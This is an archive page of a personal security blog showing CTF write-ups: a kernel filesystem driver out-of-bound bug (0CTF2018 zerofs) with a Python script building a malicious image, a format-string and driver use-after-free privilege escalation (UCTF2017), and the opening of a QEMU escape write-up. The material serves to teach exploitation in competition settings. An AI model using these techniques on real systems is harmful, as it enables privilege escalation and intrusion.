
<!DOCTYPE html>
<html lang="en">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="Eadom&#39;s Blog">
    <title>Archives - Eadom&#39;s Blog</title>
    <meta name="author" content="Eadom">
    
    
        <link rel="icon" href="https://blog.eadom.net/assets/images/avatar.jpg">
    
    
        <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
    
    <meta property="og:type" content="blog">
<meta property="og:title" content="Eadom's Blog">
<meta property="og:url" content="https://blog.eadom.net/archives/index.html">
<meta property="og:site_name" content="Eadom's Blog">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Eadom's Blog">
<meta name="twitter:creator" content="@Yufan_L">
    
    
        
    
    
        <meta property="og:image" content="https://blog.eadom.net/assets/images/avatar.jpg"/>
    
    
    
    
    <!--STYLES-->
    <link rel="stylesheet" href="/assets/css/style-yrst5vo1nxaxbp2g3v9na2wg1lixlpr3ghbjdvskeixmu79deycecx3rh4bt.min.css">
    <!--STYLES END-->
    
    
    <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?e2c34d89d7cd8c97b8b39f770eac6769";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
    </script>

</head>

    <body>
        <div id="blog">
            <!-- Define author's picture -->


    
        
            
        
    

<header id="header" data-behavior="1">
    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
    <div class="header-title">
        <a class="header-title-link" href="/ ">Eadom&#39;s Blog</a>
    </div>
    
        
            <a  class="header-right-picture "
                href="#about">
        
        
            <img class="header-picture" src="/assets/images/avatar.jpg" alt="Author&#39;s picture"/>
        
        </a>
    
</header>

            <!-- Define author's picture -->



        
    

<nav id="sidebar" data-behavior="1">
    <div class="sidebar-container">
        
            <div class="sidebar-profile">
                <a href="/#about">
                    <img class="sidebar-profile-picture" src="/assets/images/avatar.jpg" alt="Author&#39;s picture"/>
                </a>
                <h4 class="sidebar-profile-name">Eadom</h4>
                
                    <h5 class="sidebar-profile-bio"><p>NO PWN NO FUN</p>
</h5>
                
            </div>
        
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/ "
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-home"></i>
                        <span class="sidebar-button-desc">Home</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-categories"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
                        <span class="sidebar-button-desc">Categories</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-tags"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
                        <span class="sidebar-button-desc">Tags</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-archives"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
                        <span class="sidebar-button-desc">Archives</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link open-algolia-search"
                             href="#search"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-search"></i>
                        <span class="sidebar-button-desc">Search</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="#about"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-question"></i>
                        <span class="sidebar-button-desc">About</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="https://github.com/eadom" target="_blank">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-github"></i>
                        <span class="sidebar-button-desc">GitHub</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="http://weibo.com/onetpig" target="_blank">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-weibo"></i>
                        <span class="sidebar-button-desc">Weibo</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="https://twitter.com/Yufan_L" target="_blank">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
                        <span class="sidebar-button-desc">Twitter</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/atom.xml"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
                        <span class="sidebar-button-desc">RSS</span>
                    </a>
            </li>
            
        </ul>
        
    </div>
</nav>

            
            <div id="main" data-behavior="1"
                 class="
                        hasCoverMetaIn
                        ">
                
    <section class="postShorten-group main-content-wrap">
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/writeups/0ctf-2018-zerofs-writeup/">
                            0CTF2018 zerofs Writeup
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2018-04-03T00:15:39+08:00">
	
		    Apr 03, 2018
    	
    </time>
    
        <span>in </span>
        
    <a class="category-link" href="/categories/writeups/">writeups</a>


    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p><em>zerofs.ko</em> is a driver module of a custom filesystem.<br>The kernel and the module is compiled by randstruct plugin, which I found in the magic string – <code>vermagic=4.13.0 SMP mod_unload modversions</code>RANDSTRUCT_PLUGIN_3c73df5cc8285309b74c8a4caaf831205da45096402d3b1a80caab1d7fa1b03a`.<br><em>run.sh</em> and <em>/init</em> show that the kernel is protected by SMEP, SMAP, KASLR, kptr_restrict and dmesg_restrict.</p>
<h2 id="zerofs-ko"><a href="#zerofs-ko" class="headerlink" title="zerofs.ko"></a>zerofs.ko</h2><p>I found the module may be modified from <a href="https://github.com/psankar/simplefs" target="_blank" rel="external">simplefs</a> after the game.<br>By reversing <em>zerofs.ko</em>, I knew the blocksize is 4096 bits. The first block of the image is the superblock. It consists of magic, block_size, inode_count and free_blocks bitmap.</p>
<img src="/writeups/0ctf-2018-zerofs-writeup/zerofs_super_block.png" alt="zerofs_super_block" title="zerofs_super_block">
<p>The second block records all of the inodes in an array. <em>ino</em> is inode number, and dno is the block number of the image.</p>
<img src="/writeups/0ctf-2018-zerofs-writeup/zerofs_inode.png" alt="zerofs_inode" title="zerofs_inode">
<p>There is a root inode which ino is 1. It indicates the root dictionary. There is a block corresponding to root dictionary to indicates files in the dictionary. It is an array of zerofs_dir_record structure. </p>
<img src="/writeups/0ctf-2018-zerofs-writeup/zerofs_dir_record.png" alt="zerofs_dir_record" title="zerofs_dir_record">
<h2 id="Vulnerabilitie"><a href="#Vulnerabilitie" class="headerlink" title="Vulnerabilitie"></a>Vulnerabilitie</h2><p>There isn’t any bound or size check in read and write function.<br>If the filesize we set in image is bigger than blocksize(0x1000), there will be an out-of-bound read/write when invoking copy_to_user/copy_from_user.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">zerofs_read</span><span class="params">(file *filp, <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *ppos)</span></span></div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">if</span> ( copy_to_user(buf, &amp;bh0-&gt;b_data[*pos_1], len_1) ) <span class="comment">// OOB READ</span></div><div class="line">    &#123;</div><div class="line">        ...</div><div class="line">    &#125;    </div><div class="line">    ...</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">zerofs_write</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *ppos)</span></span></div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;bh0-&gt;b_data[*pos], buf, len_1) ) <span class="comment">// OOB WRITE</span></div><div class="line">    &#123;</div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="Constructing-Image"><a href="#Constructing-Image" class="headerlink" title="Constructing Image"></a>Constructing Image</h2><p>To exploit the vulnerabilities, I need to construct an malicious image. Here is the script. I put a file named <em>666</em> with size of 0xffffffffffffffff.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">block0 = p64(<span class="number">0x4F52455A</span>) + p64(<span class="number">4096</span>) + p64(<span class="number">3</span>) + p64(<span class="number">0xffffffff</span> ^ <span class="number">0x7</span>)</div><div class="line">block0 = block0.ljust(<span class="number">0x1000</span>, <span class="string">'\x00'</span>)</div><div class="line"></div><div class="line">block1 = <span class="string">''</span></div><div class="line">inode1 = p64(<span class="number">1</span>) + p64(<span class="number">2</span>) + p64(<span class="number">0x4000</span>) + p64(<span class="number">0x1</span>)</div><div class="line">inode2 = p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(<span class="number">0x8000</span>) + p64(<span class="number">0xffffffffffffffff</span>)</div><div class="line">block1 += inode1 + inode2</div><div class="line">block1 = block1.ljust(<span class="number">0x1000</span>, <span class="string">'\x00'</span>)</div><div class="line"></div><div class="line">block2 = <span class="string">''</span></div><div class="line">block2 += <span class="string">'666'</span>.ljust(<span class="number">256</span>, <span class="string">'\x00'</span>)</div><div class="line">block2 += p64(<span class="number">2</span>)</div><div class="line">block2 = block2.ljust(<span class="number">0x1000</span>, <span class="string">'\x00'</span>)</div><div class="line"></div><div class="line">img = block0 + block1 + block2 + <span class="string">'\x30'</span> * <span class="number">0x1000</span> * <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">with</span> open(<span class="string">'fs/tmp/zerofs.img'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">    f.write(img)</div></pre></td></tr></table></figure>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>After mounting the image, I could trigger out-of-bound read by read the file <em>666</em>.<br>I tried to find CRED struct in leaked memory. Fortunately, I found some by searching the uid. It took me some time to locate CRED struct because of the radomization of structures.</p>
<p>I still didn’t know which CRED is valid and which process the CRED belongs to although I could find some CRED structures. The exploit is not stable, so I run the exploit serval times. After leaking the memory, the exploit will check if it gets root privilege in a loop. If so, it invokes <code>system(&quot;sha256sum /root/flag&quot;);</code>.</p>
<p>The last step is to write the CRED. I invoked llseek to set offset to the CRED, and invoked write to modify the CRED, setting uid to 0.</p>
<p>Here is the <a href="https://gist.github.com/Eadom/29f8627d428a90842a99b2c176d4789a" target="_blank" rel="external">expliot</a></p>
<img src="/writeups/0ctf-2018-zerofs-writeup/get_flag.png" alt="get_flag" title="get_flag">

                    
                        
                    
                    
                        <p>
                            <a href="/writeups/0ctf-2018-zerofs-writeup/#post-footer" class="postShorten-excerpt_link link">
                                Comment and share
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/writeups/uctf-2017-quals-pwn-writeup/">
                            UCTF2017 初赛 PWN题 Writeup
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2017-07-10T16:44:39+08:00">
	
		    Jul 10, 2017
    	
    </time>
    
        <span>in </span>
        
    <a class="category-link" href="/categories/writeups/">writeups</a>


    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <blockquote>
<p>题目中上，但各种乱象毁了这个比赛。</p>
</blockquote>
<h2 id="NotFormat"><a href="#NotFormat" class="headerlink" title="NotFormat"></a>NotFormat</h2><h3 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h3><p>程序是静态链接的，利用缓解机制只启用了NX,程序只是一个简单的读取输入并返回。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ checksec NotFormat</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ ./NotFormat</div><div class="line">Have fun!</div><div class="line">test</div><div class="line">test</div></pre></td></tr></table></figure>
<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>程序main函数很短，如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">double</span> v8; <span class="comment">// xmm4_8@1</span></div><div class="line">  <span class="keyword">double</span> v9; <span class="comment">// xmm5_8@1</span></div><div class="line">  <span class="keyword">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h]@1</span></div><div class="line">  __int64 v11; <span class="comment">// [rsp+108h] [rbp-8h]@1</span></div><div class="line"></div><div class="line">  v11 = *MK_FP(__FS__, <span class="number">40L</span>L);</div><div class="line">  setvbuf((<span class="keyword">int</span> *)off_6CB740, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Have fun!"</span>);</div><div class="line">  read_line(buf);</div><div class="line">  <span class="built_in">printf</span>(buf, <span class="number">0L</span>L);</div><div class="line">  <span class="built_in">exit</span>(<span class="number">0L</span>L);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>存在一个很明显的格式化字符串漏洞。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>因为格式化字符串使用之后立即就调用exit退出了，所以目标是直接通过一次printf劫持控制流。</p>
<h4 id="控制RIP"><a href="#控制RIP" class="headerlink" title="控制RIP"></a>控制RIP</h4><p>我用到的是修改FILE *stdout结构的vtable到我们构造的位置。由于没有开启PIE，所以这些内容的位置都可以确定。</p>
<h4 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h4><p>当控制RIP之后，程序的栈的位置与我们输入内容的位置差距很大，但是正好找到这个gadget可以迁移到我们输入的buffer。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x43f17d : ret 0x6b8</div></pre></td></tr></table></figure>
<p>ret之后正好会跳到0x0457fc1位置，实现栈迁移。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x457fc1 : add rsp, 0x2120 ; mov eax, r12d ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; re</div></pre></td></tr></table></figure>
<p>之后可以再次调用read，并再次迁移到一个大buffer。最后调用<code>execve(&quot;/bin/sh&quot;, 0, 0)</code></p>
<p><a href="https://gist.github.com/Eadom/9be3d15affa56ae96b72bcdbdefbce34" target="_blank" rel="external">uctf2017_notformat.py</a></p>
<h2 id="babydriver"><a href="#babydriver" class="headerlink" title="babydriver"></a>babydriver</h2><h3 id="概览-1"><a href="#概览-1" class="headerlink" title="概览"></a>概览</h3><p>这是一个简单的驱动题，只开启了SMEP(貌似也用不到……)。</p>
<p>提供了<code>/dev/babydriver</code>设备:</p>
<ul>
<li>read/write操作可以将buf从<code>babydev_struct.device_buf</code>读取或写入，长度限制为<code>babydev_struct.device_buf_len</code>。</li>
<li>ioctl的cmd为0x10001时可以对<code>babydev_struct.device_buf</code>重新分配。</li>
<li>close时会将<code>babydev_struct.device_buf</code>释放。</li>
</ul>
<h3 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h3><p>一个最明显的漏洞是<code>babydev_struct</code>是一个全局变量，所有的文件描述符都共享一个<code>babydev_struct</code>，当一个文件描述符被调用close时，<code>babydev_struct.device_buf</code>会被释放。当其他未关闭的文件描述符调用时，会触发UAF，可以对一段内核空间进行读写。</p>
<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>当device_buf被释放掉后，这个指针成为悬空指针，扔可以进行读写，这时候希望可以有一个结构被申请然后占到原来的这个位置。最直观的想法就是如果能有cred结构直接占上来，然后就可以对cred内容修改，达到获取root权限的目的。</p>
<p>cred结构如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> cred &#123;</div><div class="line">	<span class="keyword">atomic_t</span>	usage;</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></div><div class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></div><div class="line">	<span class="keyword">void</span>		*put_addr;</div><div class="line">	<span class="keyword">unsigned</span>	magic;</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></div><div class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></div><div class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></div><div class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></div><div class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></div><div class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></div><div class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></div><div class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></div><div class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></div><div class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></div><div class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we're permitted */</span></div><div class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></div><div class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></div><div class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></div><div class="line">					 * keys to */</div><div class="line">	<span class="keyword">struct</span> key __rcu *session_keyring; <span class="comment">/* keyring inherited over fork */</span></div><div class="line">	<span class="keyword">struct</span> key	*process_keyring; <span class="comment">/* keyring private to this process */</span></div><div class="line">	<span class="keyword">struct</span> key	*thread_keyring; <span class="comment">/* keyring private to this thread */</span></div><div class="line">	<span class="keyword">struct</span> key	*request_key_auth; <span class="comment">/* assumed request_key authority */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></div><div class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">	<span class="keyword">struct</span> user_struct *user;	<span class="comment">/* real user ID subscription */</span></div><div class="line">	<span class="keyword">struct</span> user_namespace *user_ns; <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></div><div class="line">	<span class="keyword">struct</span> group_info *group_info;	<span class="comment">/* supplementary groups for euid/fsgid */</span></div><div class="line">	<span class="keyword">struct</span> rcu_head	rcu;		<span class="comment">/* RCU deletion hook */</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>它的大小是0xa8。于是利用的步骤如下：</p>
<ol>
<li>open两个fd，fd1及fd2。通过ioctl设置device_buf为0xa8大小。</li>
<li>close(fd1)，device_buf指针被释放。</li>
<li>现在可以通过fd2继续操作device_buf指向的内容。</li>
<li>通过fork一堆进程试图在申请cred结构的时候占到device_buf指向的位置。</li>
<li>修改占上的cred，获取root。 </li>
</ol>
<p>做的时候粗暴地试试结果发现就可以占上了……然后粗暴的把ctf用户的所有的id为0x3e8的都改成了0。</p>
<p><a href="https://gist.github.com/Eadom/c88f1eab2853281583aab150382ec710" target="_blank" rel="external">uctf2017_babydriver.py</a></p>
<p>P.S. 出题时希望可以把网卡驱动带进去，不然传程序进去也挺麻烦……</p>

                    
                        
                    
                    
                        <p>
                            <a href="/writeups/uctf-2017-quals-pwn-writeup/#post-footer" class="postShorten-excerpt_link link">
                                Comment and share
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/writeups/qemu-escape-vm-escape-from-0ctf-2017-finals-writeup/">
                            QEMU Escape --- vm_escape from 0CTF 2017 Finals Writeup
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2017-06-16T00:04:14+08:00">
	
		    Jun 16, 2017
    	
    </time>
    
        <span>in </span>
        
    <a class="category-link" href="/categories/writeups/">writeups</a>


    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <p>It’s a great challenge to get familiar with QEMU escape. We are going to exploit QEMU via a custom vulnerable device.</p>
<p>You should read <a href="http://www.phrack.org/papers/vm-escape-qemu-case-study.html" target="_blank" rel="external">VM escape - QEMU Case Study</a> before reading this writeup.</p>
<h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">challenge</div><div class="line">├── dependency</div><div class="line">│   ├── libnettle.so.6.2</div><div class="line">│   └── usr</div><div class="line">│       └── local</div><div class="line">│           └── share</div><div class="line">│               └── qemu</div><div class="line">│                   ├── bios-256k.bin</div><div class="line">│                   ├── efi-e1000.rom</div><div class="line">│                   ├── kvmvapic.bin</div><div class="line">│                   ├── linuxboot_dma.bin</div><div class="line">│                   └── vgabios-stdvga.bin</div><div class="line">├── launch.sh</div><div class="line">├── qemu-system-x86_64</div><div class="line">├── rootfs.cpio</div><div class="line">└── vmlinuz-4.8.0-52-generic</div></pre></td></tr></table></figure>
<p>There is a <em>qemu-system-x86_64</em> binary with a launch script, a linux kernel, a initramfs and some dependencies.</p>
<p>We can get an interactive shell by executing <code>launch.sh</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">    __ __ _____________   __   __    ___    ____</div><div class="line">   / //_// ____/ ____/ | / /  / /   /   |  / __ )</div><div class="line">  / ,&lt;  / __/ / __/ /  |/ /  / /   / /| | / __  |</div><div class="line"> / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /</div><div class="line">/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/</div><div class="line"></div><div class="line">Welcome to Tencent Keenlab</div><div class="line">Tencent login: root</div><div class="line"># uname -r</div><div class="line">4.8.0-52-generic</div><div class="line">#</div></pre></td></tr></table></figure>
<h2 id="The-custom-vulnerable-device"><a href="#The-custom-vulnerable-device" class="headerlink" title="The custom vulnerable device"></a>The custom vulnerable device</h2><p><em>luanch.sh</em> shows there are two custom device named <em>vdd</em>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ ./qemu-system-x86_64 -device help 2&gt;&amp;1 | grep VDD</div><div class="line">name &quot;VDD&quot;, bus PCI, desc &quot;KeenLab virtualized Devices For Testing D&quot;</div></pre></td></tr></table></figure>
<p>we can use some commands to find these devices and their io port/memroy.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"># lspci</div><div class="line">00:00.0 Class 0600: 8086:1237</div><div class="line">00:01.3 Class 0680: 8086:7113</div><div class="line">00:03.0 Class 0200: 8086:100e</div><div class="line">00:01.1 Class 0101: 8086:7010</div><div class="line">00:02.0 Class 0300: 1234:1111</div><div class="line">00:05.0 Class 00ff: 1234:2333</div><div class="line">00:01.0 Class 0601: 8086:7000</div><div class="line">00:04.0 Class 00ff: 1234:2333</div><div class="line"># cat /proc/iomem</div><div class="line">...</div><div class="line">  fe900000-fe9fffff : 0000:00:04.0</div><div class="line">  fea00000-feafffff : 0000:00:05.0</div><div class="line">...</div><div class="line"># cat /proc/ioports</div><div class="line">...</div><div class="line">  c000-c0ff : 0000:00:04.0</div><div class="line">  c100-c1ff : 0000:00:05.0</div><div class="line">...</div></pre></td></tr></table></figure>
<h3 id="OOBW"><a href="#OOBW" class="headerlink" title="OOBW"></a>OOBW</h3><p>In <code>vdd_mmio_write</code>, there is a out-of-bound write vulnerability which copys QEMU heap memory to guset physical memory when we set <code>dma_len</code> larger than <code>sizeof(dam_buf)</code>.</p>
